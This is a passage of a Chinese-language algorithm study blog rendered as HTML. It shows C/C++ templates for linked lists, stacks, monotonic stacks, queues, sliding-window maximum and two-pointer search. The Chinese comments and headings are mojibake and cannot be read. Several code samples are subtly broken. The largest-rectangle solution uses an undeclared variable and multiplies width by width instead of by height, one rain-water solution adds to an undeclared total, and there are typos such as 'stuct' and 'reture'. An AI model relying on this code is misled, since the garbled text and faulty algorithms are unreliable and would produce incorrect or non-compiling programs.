class="hljs-comment">// æ–°èŠ‚ç‚¹çš„nextæŒ‡å‘ç¬¬kä¸ªèŠ‚ç‚¹</span><br>    ne[cur] = idx;      <span class="hljs-comment">// ç¬¬k-1ä¸ªèŠ‚ç‚¹çš„nextæŒ‡å‘æ–°èŠ‚ç‚¹</span><br>    idx++;<br>&#125;<br><span class="hljs-comment">// åˆ é™¤ç¬¬kä¸ªä½ç½®çš„å…ƒç´  (kæ˜¯ä»1å¼€å§‹çš„)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">removeAt</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-keyword">if</span> (k == <span class="hljs-number">1</span>) &#123;<br>        remove();  <span class="hljs-comment">// å¦‚æœåˆ é™¤çš„æ˜¯å¤´ç»“ç‚¹ï¼Œç›´æ¥è°ƒç”¨åˆ é™¤å¤´ç»“ç‚¹çš„å‡½æ•°</span><br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-comment">// æ‰¾åˆ°ç¬¬k-1ä¸ªèŠ‚ç‚¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k - <span class="hljs-number">1</span> &amp;&amp; cur != <span class="hljs-number">-1</span>; i++) &#123;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">-1</span> || ne[cur] == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span>;  <span class="hljs-comment">// kè¶…å‡ºèŒƒå›´</span><br>    <span class="hljs-comment">// åˆ é™¤ç¬¬kä¸ªèŠ‚ç‚¹</span><br>    <span class="hljs-type">int</span> temp = ne[cur];<br>    ne[cur] = ne[temp];  <span class="hljs-comment">// ç¬¬k-1ä¸ªèŠ‚ç‚¹çš„nextæŒ‡å‘ç¬¬k+1ä¸ªèŠ‚ç‚¹</span><br>&#125;<br><span class="hljs-comment">// æŸ¥æ‰¾ç¬¬kä¸ªä½ç½®çš„å…ƒç´  (kæ˜¯ä»1å¼€å§‹çš„)</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getAt</span><span class="hljs-params">(<span class="hljs-type">int</span> k)</span> &#123;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-comment">// éå†åˆ°ç¬¬kä¸ªèŠ‚ç‚¹</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; k &amp;&amp; cur != <span class="hljs-number">-1</span>; i++) &#123;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-keyword">if</span> (cur == <span class="hljs-number">-1</span>) <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;  <span class="hljs-comment">// å¦‚æœkè¶…å‡ºäº†é“¾è¡¨çš„èŒƒå›´</span><br>    <span class="hljs-keyword">return</span> e[cur];<br>&#125;<br><span class="hljs-comment">// è¾“å‡ºé“¾è¡¨æ‰€æœ‰å…ƒç´ </span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printList</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> cur = head;<br>    <span class="hljs-keyword">while</span> (cur != <span class="hljs-number">-1</span>) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; e[cur] &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>        cur = ne[cur];<br>    &#125;<br>    <span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">endl</span>;<br>&#125;<br><br><br><br><br></code></pre></td></tr></table></figure><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs perl">head  head æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘é“¾è¡¨çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå› æ­¤å®ƒè¡¨ç¤ºæ•´ä¸ªé“¾è¡¨çš„èµ·å§‹<br><span class="hljs-number">1</span>-&gt;<span class="hljs-number">2</span>-&gt;<span class="hljs-number">3</span>-&gt;<span class="hljs-number">4</span>-&gt;null(è¡¥å……çš„<span class="hljs-keyword">last</span>)<br><br> struct ListNode &#123;<br>    <span class="hljs-keyword">int</span> val;<br>    ListNode* <span class="hljs-keyword">next</span>;<br>    ListNode(<span class="hljs-keyword">int</span> <span class="hljs-keyword">x</span>) : val(<span class="hljs-keyword">x</span>), <span class="hljs-keyword">next</span>(nullptr) &#123;&#125;<br>&#125;;<br><br>ListNode* reverseList(ListNode* head) &#123;<br>    ListNode* <span class="hljs-keyword">last</span> = nullptr;<br>    <span class="hljs-keyword">while</span> (head != nullptr) &#123;<br>        ListNode* nextHead = head-&gt;<span class="hljs-keyword">next</span>;  <span class="hljs-regexp">//</span> æš‚å­˜ä¸‹ä¸€ä¸ªèŠ‚ç‚¹<br>        head-&gt;<span class="hljs-keyword">next</span> = <span class="hljs-keyword">last</span>;                <span class="hljs-regexp">//</span> åè½¬å½“å‰èŠ‚ç‚¹çš„æŒ‡é’ˆ<br>        <span class="hljs-keyword">last</span> = head;                      <span class="hljs-regexp">//</span> æ›´æ–°<span class="hljs-keyword">last</span>ä¸ºå½“å‰èŠ‚ç‚¹<br>        head = nextHead;                  <span class="hljs-regexp">//</span> ç»§ç»­å¤„ç†ä¸‹ä¸€ä¸ªèŠ‚ç‚¹<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">last</span>;                          <span class="hljs-regexp">//</span> è¿”å›æ–°å¤´èŠ‚ç‚¹<br>&#125;<br><br></code></pre></td></tr></table></figure><p>+++++</p><h2 id="ä¸ƒ-æ ˆ"><a href="#ä¸ƒ-æ ˆ" class="headerlink" title="ä¸ƒ.æ ˆ"></a>ä¸ƒ.æ ˆ</h2><h3 id="æ¨¡æ‹Ÿæ ˆ"><a href="#æ¨¡æ‹Ÿæ ˆ" class="headerlink" title="æ¨¡æ‹Ÿæ ˆ"></a>æ¨¡æ‹Ÿæ ˆ</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// ttè¡¨ç¤ºæ ˆé¡¶</span><br><span class="hljs-type">int</span> stk[N], tt = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// å‘æ ˆé¡¶æ’å…¥ä¸€ä¸ªæ•°</span><br>stk[ ++ tt] = x;<br><span class="hljs-comment">// ä»æ ˆé¡¶å¼¹å‡ºä¸€ä¸ªæ•°</span><br>tt -- ;<br><span class="hljs-comment">// æ ˆé¡¶çš„å€¼</span><br>stk[tt];<br><span class="hljs-comment">// åˆ¤æ–­æ ˆæ˜¯å¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span> (tt &gt; <span class="hljs-number">0</span>)<br>&#123;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å•è°ƒæ ˆ"><a href="#å•è°ƒæ ˆ" class="headerlink" title="å•è°ƒæ ˆ"></a>å•è°ƒæ ˆ</h3><p>ç»éªŒ</p><p>å½“æ–°hå°äºä¹‹å‰çš„h,è¿›è¡Œç´¯åŠ é•¿åº¦æ›´æ–°ç­”æ¡ˆ,popä¸Šä¸€ä¸ªè¢«æ¨çš„æ ˆ,æ¨ç´¯é•¿åŠ ä¸€çš„hæ ˆ</p><p>æ ¸å¿ƒæ€æƒ³:å•è°ƒæ ˆè€ƒè™‘å‰é¢ä¸å½±å“åé¢<br>å¥—è·¯æ¨¡ç‰ˆ: </p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">int</span> res = <span class="hljs-number">0</span>; <span class="hljs-comment">//intä¸€ä¸ªç­”æ¡ˆè¦å…¨å±€</span><br>heights.push_back(<span class="hljs-number">0</span>);  <span class="hljs-comment">// å¦‚æœéœ€è¦å¼¹ç©ºå°±å†™</span><br><span class="hljs-keyword">for</span>()&#123;<br><span class="hljs-keyword">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span>(æ ˆé¡¶ä¸æ–°å…ƒç´ ä¸æ»¡è¶³å•è°ƒæ ˆ)&#123;<br> ç´¯åŠ é•¿åº¦<br> æ›´æ–°ç­”æ¡ˆ<br> <span class="hljs-keyword">pop</span>å¼¹æ ˆ<br> ....... <span class="hljs-comment">//æœŸé—´å¯ä»¥æ€è€ƒå¢åŠ é™åˆ¶</span><br>&#125;<br>s.<span class="hljs-keyword">push</span>(&#123;accmulatedWidth+<span class="hljs-number">1</span>,height&#125;);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¾‹å­-3"><a href="#ä¾‹å­-3" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h3><h4 id="æŸ±çŠ¶å›¾ä¸­æœ€å¤§çŸ©å½¢"><a href="#æŸ±çŠ¶å›¾ä¸­æœ€å¤§çŸ©å½¢" class="headerlink" title="æŸ±çŠ¶å›¾ä¸­æœ€å¤§çŸ©å½¢"></a>æŸ±çŠ¶å›¾ä¸­æœ€å¤§çŸ©å½¢</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c">heighs=[<span class="hljs-number">2</span>,<span class="hljs-number">1</span>,<span class="hljs-number">6</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] <br>private:<br>stuct UERT&#123;<br><span class="hljs-type">int</span> width;<br><span class="hljs-type">int</span> height;<br>&#125;;<br><span class="hljs-built_in">stack</span> &lt;UERT&gt; s;<br>public:<br><span class="hljs-type">int</span> <span class="hljs-title function_">largestRectangleArea</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> &#123;<br>    <span class="hljs-type">int</span> res = <span class="hljs-number">0</span>;<br>    heights.push_back(<span class="hljs-number">0</span>);  <span class="hljs-comment">// ä¾¿äºæœ€åæ¸…ç©ºæ ˆ</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> height:heights) &#123;<br>    <span class="hljs-type">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// å¦‚æœå½“å‰æŸ±å­çš„é«˜åº¦å°äºæ ˆé¡¶æŸ±å­çš„é«˜åº¦ï¼Œåˆ™è®¡ç®—é¢ç§¯</span><br>            <span class="hljs-keyword">while</span> (!s.empty() &amp;&amp; s.top().height &gt;= height) &#123;<br>                accmulatedWidth += s.top().width;<br>                res = max(ans,s.top().width*accmulatedWidth);            <br>                s.pop();            <br>        &#125;<br>        s.push(&#123;accmulatedWidth+<span class="hljs-number">1</span>,height&#125;);  <span class="hljs-comment">// å°†å½“å‰æŸ±å­çš„ç´¢å¼•å‹å…¥æ ˆ</span><br>   &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ¥é›¨æ°´"><a href="#æ¥é›¨æ°´" class="headerlink" title="æ¥é›¨æ°´"></a>æ¥é›¨æ°´</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs c"><br>private:<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">UERT</span>&#123;</span><br><span class="hljs-type">int</span> width;<br><span class="hljs-type">int</span> height;<br>&#125;;<br><span class="hljs-built_in">stack</span> &lt;UERT&gt; s;<br>public:<br><span class="hljs-type">int</span> <span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> height:heights) &#123;<br>            <span class="hljs-type">int</span> accmulatedWidth = <span class="hljs-number">0</span>;<br>            <span class="hljs-comment">// å¦‚æœå½“å‰æŸ±å­çš„é«˜åº¦å¤§äºæ ˆé¡¶æŸ±å­ï¼Œè®¡ç®—èƒ½å­˜å‚¨çš„é›¨æ°´</span><br>            <span class="hljs-keyword">while</span> (!s.empty() &amp;&amp; s.top().height &lt;= height) &#123;<br>                <span class="hljs-type">int</span> bottom = s.top().height;<br>                accmulatedWidth += s.top().width;<br>                s.pop();<br>                <span class="hljs-keyword">if</span> (s.empty()) <span class="hljs-keyword">continue</span>;  <span class="hljs-comment">// å¦‚æœæ ˆä¸ºç©ºï¼Œè·³è¿‡,æ°´ä»å·¦è¾¹æºœèµ°äº†</span><br>                <span class="hljs-type">int</span> up = min(height,s.top().height);<br>                ans += accmulatedWidth*(up-bottom);<br>            &#125;<br>            s.push(&#123;accmulatedWidth+<span class="hljs-number">1</span>,height&#125;);  <span class="hljs-comment">// å°†å½“å‰æŸ±å­çš„ç´¢å¼•å‹å…¥æ ˆ</span><br>        &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br><br>å‰ç¼€å’Œæ€æƒ³<br><span class="hljs-type">int</span> <span class="hljs-title function_">trap</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; heights)</span> &#123;<br>    <span class="hljs-type">int</span> n = heights.size();<br>    preMax = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n);<br>    sufMax = <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(n);<br>    <br>    <span class="hljs-comment">// é¢„å¤„ç†preMaxæ•°ç»„</span><br>    preMax[<span class="hljs-number">0</span>] = heights[<span class="hljs-number">0</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n; i++) &#123;<br>        preMax[i] = max(preMax[i - <span class="hljs-number">1</span>], heights[i]);<br>    &#125;<br><br>    <span class="hljs-comment">// é¢„å¤„ç†sufMaxæ•°ç»„</span><br>    sufMax[n - <span class="hljs-number">1</span>] = heights[n - <span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = n - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--) &#123;<br>        sufMax[i] = max(sufMax[i + <span class="hljs-number">1</span>], heights[i]);<br>    &#125;<br><br>    <span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt; n - <span class="hljs-number">1</span>; i++) &#123;<br>        <span class="hljs-type">int</span> up = min(preMax[i - <span class="hljs-number">1</span>], sufMax[i + <span class="hljs-number">1</span>]);<br>        <span class="hljs-type">int</span> bottom = heights[i];<br>        <span class="hljs-keyword">if</span> (up &gt; bottom) &#123;<br>            ans += up - bottom;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> ans;<br>&#125;<br>preMax[]ï¼šè®°å½•å½“å‰ä½ç½®å·¦ä¾§çš„æœ€å¤§é«˜åº¦ã€‚<br>sufMax[]ï¼šè®°å½•å½“å‰ä½ç½®å³ä¾§çš„æœ€å¤§é«˜åº¦ã€‚<br></code></pre></td></tr></table></figure><p>+++++</p><h2 id="å…«-é˜Ÿåˆ—å’ŒåŒæŒ‡é’ˆ"><a href="#å…«-é˜Ÿåˆ—å’ŒåŒæŒ‡é’ˆ" class="headerlink" title="å…«.é˜Ÿåˆ—å’ŒåŒæŒ‡é’ˆ"></a>å…«.é˜Ÿåˆ—å’ŒåŒæŒ‡é’ˆ</h2><p>æ¨¡æ‹Ÿé˜Ÿåˆ—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// hh è¡¨ç¤ºé˜Ÿå¤´ï¼Œttè¡¨ç¤ºé˜Ÿå°¾</span><br><span class="hljs-type">int</span> q[N], hh = <span class="hljs-number">0</span>, tt = <span class="hljs-number">-1</span>;<br><span class="hljs-comment">// å‘é˜Ÿå°¾æ’å…¥ä¸€ä¸ªæ•°</span><br>q[ ++ tt] = x;<br><span class="hljs-comment">// ä»é˜Ÿå¤´å¼¹å‡ºä¸€ä¸ªæ•°</span><br>hh ++ ;<br><span class="hljs-comment">// é˜Ÿå¤´çš„å€¼</span><br>q[hh];<br><span class="hljs-comment">// åˆ¤æ–­é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º</span><br><span class="hljs-keyword">if</span> (hh &lt;= tt)<br>&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="å•è°ƒé˜Ÿåˆ—"><a href="#å•è°ƒé˜Ÿåˆ—" class="headerlink" title="å•è°ƒé˜Ÿåˆ—"></a>å•è°ƒé˜Ÿåˆ—</h3><p>æˆ‘ä»¬å°±å¸Œæœ›å»ç»´æŠ¤ä¸€ä¸ªè¿™æ ·çš„å€™é€‰,é›†åˆé‡Œè¾¹çš„å…ƒç´ ï¼Œå®ƒä»¬çš„å€¼æ˜¯é€’å‡çš„ã€‚æ‰€ä»¥å½“Iå®ƒå¤§äºç­‰äºk-1æ—¶ï¼Œæˆ‘å·²ç»æ”’å¤Ÿäº†ã€‚qçš„å€¼æ˜¯é€’å‡çš„å‘€ï¼Œå¯èƒ½æˆä¸ºä¸€ä¸ªç­”æ¡ˆçš„é€‰é¡¹ï¼Œé‚£ä¹ˆæ­¤æ—¶å°±å¯¹å¤´æœ€å¥½ï¼Œæˆ‘å°±å–å¯¹å¤´ä½œä¸ºç­”æ¡ˆã€‚è¿™å°±æ˜¯æˆ‘ä»¬è¦å¹²ä¸‰ä»¶äº‹æƒ…ã€‚</p><p>å•è°ƒé˜Ÿåˆ—ç»´æŠ¤çš„æ˜¯ä¸€ä¸ªå€™é€‰é›†åˆï¼Œå‰é¢çš„æ¯”è¾ƒæ—§ï¼Œåé¢çš„æ¯”è¾ƒæ–°(æ—¶é—´æœ‰å•è°ƒæ€§</p><p>å€™é€‰é¡¹çš„æŸä¸ªå±æ€§ä¹Ÿå…·æœ‰å•è°ƒæ€§</p><p>ç¡®å®šé€’å¢é€’å‡çš„æ–¹æ³•â€“è€ƒè™‘ä»»æ„ä¸¤ä¸ªå€™é€‰é¡¶j&lt;j2ï¼Œå†™å‡ºjæ¯”ä¼˜çš„æ¡ä»¶</p><p>æ’é™¤å†—ä½™çš„å…³é”®:è‹¥jæ¯”jå·®ï¼Œjçš„ç”Ÿå‘½å‘¨æœŸè¿˜æ¯”äº†çŸ­ï¼Œé‚£äº† å°±æ²¡åµç”¨äº†</p><p>å•è°ƒé˜Ÿåˆ—é¢˜ç›®ä»£ç å¥—è·¯:<br>Â·for æ¯ä¸ªå…ƒç´ <br>    (1)while(é˜Ÿå¤´è¿‡æœŸ)é˜Ÿå¤´å‡ºé˜Ÿ<br>    (2)å–é˜Ÿå¤´ä¸ºæœ€ä½³é€‰é¡¹ï¼Œè®¡ç®—ç­”æ¡ˆ                                                                                                                                            (3)while(é˜Ÿå°¾ä¸æ–°å…ƒç´ ä¸æ»¡è¶³å•è°ƒæ€§)é˜Ÿå°¾å‡ºé˜Ÿ                                                                                                                                                                                                                                                        (3)æ–°å…ƒç´ å…¥é˜Ÿ</p><h3 id="ä¾‹é¢˜-2"><a href="#ä¾‹é¢˜-2" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h3><h4 id="æ‰¾åˆ°æ»‘åŠ¨çª—å£æœ€å¤§å€¼"><a href="#æ‰¾åˆ°æ»‘åŠ¨çª—å£æœ€å¤§å€¼" class="headerlink" title="æ‰¾åˆ°æ»‘åŠ¨çª—å£æœ€å¤§å€¼"></a>æ‰¾åˆ°æ»‘åŠ¨çª—å£æœ€å¤§å€¼</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> &#123;</span><br>public:<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title function_">maxSlidingWindow</span><span class="hljs-params">(<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;&amp; nums, <span class="hljs-type">int</span> k)</span> &#123;<br>        <span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt; ans; <span class="hljs-comment">// å­˜å‚¨ç»“æœ</span><br>        <span class="hljs-built_in">deque</span>&lt;<span class="hljs-type">int</span>&gt; q; <span class="hljs-comment">// ç”¨äºç»´æŠ¤æ»‘åŠ¨çª—å£çš„åŒç«¯é˜Ÿåˆ—</span><br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nums.size(); i++) &#123;<br>            <span class="hljs-comment">// åˆ é™¤è¿‡æœŸå…ƒç´ ï¼šå¦‚æœé˜Ÿé¦–å…ƒç´ ä¸åœ¨å½“å‰çª—å£èŒƒå›´å†…ï¼Œåˆ™å¼¹å‡ºé˜Ÿé¦–</span><br>            <span class="hljs-keyword">while</span> (!q.empty() &amp;&amp; q.front() &lt;= i - k) &#123;<br>                q.pop_front();<br>            &#125;<br><br>            <span class="hljs-comment">// æ’å…¥æ–°å…ƒç´ ï¼šç§»é™¤é˜Ÿåˆ—ä¸­æ‰€æœ‰å°äºå½“å‰å…ƒç´ çš„å€¼ï¼Œä»¥ä¿æŒé€’å‡é¡ºåº</span><br>            <span class="hljs-keyword">while</span> (!q.empty() &amp;&amp; nums[q.back()] &lt;= nums[i]) &#123;<br>                q.pop_back();<br>            &#125;<br><br>            <span class="hljs-comment">// å°†å½“å‰å…ƒç´ çš„ç´¢å¼•åŠ å…¥åˆ°é˜Ÿåˆ—ä¸­</span><br>            q.push_back(i);<br><br>            <span class="hljs-comment">// è®°å½•å½“å‰çª—å£çš„æœ€å¤§å€¼ï¼šé˜Ÿé¦–å…ƒç´ å³ä¸ºçª—å£å†…çš„æœ€å¤§å€¼</span><br>            <span class="hljs-keyword">if</span> (i &gt;= k - <span class="hljs-number">1</span>) &#123;<br>                ans.push_back(nums[q.front()]);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> ans;<br>    &#125;<br>&#125;;<br><br></code></pre></td></tr></table></figure><h3 id="äºŒç»´å•è°ƒé˜Ÿåˆ—"><a href="#äºŒç»´å•è°ƒé˜Ÿåˆ—" class="headerlink" title="äºŒç»´å•è°ƒé˜Ÿåˆ—"></a>äºŒç»´å•è°ƒé˜Ÿåˆ—</h3><h3 id="åŒæŒ‡é’ˆ"><a href="#åŒæŒ‡é’ˆ" class="headerlink" title="åŒæŒ‡é’ˆ"></a>åŒæŒ‡é’ˆ</h3><p><strong>å®šä¹‰</strong>ï¼šé€šè¿‡ä¸€å·¦ä¸€å³æˆ–ä¸€å‰ä¸€åä¸¤ä¸ªæŒ‡é’ˆé€¼è¿‘æ¥æ‰¾åˆ°ç¬¦åˆæ¡ä»¶çš„è§£</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gcode">for<span class="hljs-comment">(i=0,j=0;i&lt;n;i++)</span>&#123;<br><span class="hljs-keyword">while</span> <span class="hljs-comment">(j&lt;i&amp;&amp;check(i,j)</span>)j++;<br><span class="hljs-comment">//æ¯é“é¢˜ç›®çš„å…·ä½“é€»è¾‘</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ä¾‹å­-4"><a href="#ä¾‹å­-4" class="headerlink" title="ä¾‹å­"></a>ä¾‹å­</h4><h5 id="ä¸¤æ•°ä¹‹å’Œï¼š"><a href="#ä¸¤æ•°ä¹‹å’Œï¼š" class="headerlink" title="ä¸¤æ•°ä¹‹å’Œï¼š"></a>ä¸¤æ•°ä¹‹å’Œï¼š</h5><p>ç»™å®šä¸€ä¸ªæœ‰åºæ•°ç»„ï¼Œæ‰¾åˆ°ä¸¤ä¸ªæ•°ï¼Œä½¿å¾—å®ƒä»¬çš„å’Œç­‰äºç›®æ ‡å€¼ <code>target</code>ã€‚è¿”å›è¿™ä¸¤ä¸ªæ•°çš„ä¸‹æ ‡ï¼Œå‡å®šæ•°ç»„å†…æ²¡æœ‰é‡å¤è§£ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs cpp">è¾“å…¥æœ‰åº<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">twoSum</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; numbers, <span class="hljs-type">int</span> target)</span> </span>&#123;<br>    <span class="hljs-type">int</span> j = numbers.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;  <span class="hljs-comment">// ä¸¤ä¸ªæŒ‡é’ˆä»æ•°ç»„ä¸¤ç«¯å¼€å§‹</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>; i&lt;numbers.<span class="hljs-built_in">size</span>(); i++)&#123;<br>        <span class="hljs-keyword">while</span>(i&lt;j &amp;&amp; numbers[i]+numbers[j]&gt;target)j--;<br>        <span class="hljs-keyword">if</span> (i&lt;j &amp;&amp; numbers[i] + numbers[j] == target) &#123;<br>            reture &#123;i<span class="hljs-number">+1</span>,j<span class="hljs-number">+1</span>&#125;<br>        &#125;   <br>    &#125;<br>    <span class="hljs-keyword">return</span> &#123;&#125;;  <span class="hljs-comment">// 